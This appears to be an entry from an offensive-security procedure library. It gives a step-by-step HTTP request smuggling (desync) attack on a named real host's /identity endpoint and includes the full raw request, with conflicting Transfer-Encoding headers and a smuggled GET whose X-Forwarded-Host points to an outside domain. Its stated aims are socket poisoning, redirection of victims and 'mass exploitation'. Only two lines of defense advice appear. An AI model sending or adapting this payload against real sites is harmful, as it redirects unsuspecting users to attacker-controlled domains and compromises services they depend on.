---
tags:
  - http-request-smuggling
  - desync
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/http-smuggling-post-desync-redirection]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e05309e9-9e96-4adc-9c79-4891aed2f1a3
created_at: '2025-12-13T09:01:21.730Z'
updated_at: '2025-12-13T09:01:21.730Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Send Desync Request for Redirection

## Summary

This procedure crafts and sends an HTTP POST request with conflicting headers to exploit a request smuggling vulnerability, smuggling a GET request that redirects to a malicious domain.

## Description

The attack targets the /identity endpoint on launchpad.37signals.com, using a valid Transfer-Encoding: chunked followed by an invalid one to cause desynchronization. The frontend uses Content-Length, while the backend processes chunked encoding, allowing smuggling.

## Requirements

1. Access to Turbo Intruder tool
2. Network connectivity to https://launchpad.37signals.com:443
3. No authentication needed

## Defense

Defensive measures and detection strategies:

- Implement strict header validation in load balancers and servers
- Monitor for anomalous Transfer-Encoding and Content-Length combinations in logs

## Objectives

1. Poison the socket for subsequent requests
2. Smuggle a redirection request
3. Enable mass exploitation

## Instructions

### Step 1: Prepare and Send Desync Request

**Context**: Craft the request to exploit the desync and append the smuggled GET.

**Command** ([[commands/http-smuggling-post-desync-redirection]]):
```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar
```

> This command sends the desync request, poisoning the socket; expect no immediate output but confirmation via subsequent victim simulations.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/http-smuggling-post-desync-redirection]]

## Tools Used

- [[tools/Turbo-Intruder]]

## Tags

- [[http-request-smuggling]]
- [[desync]]
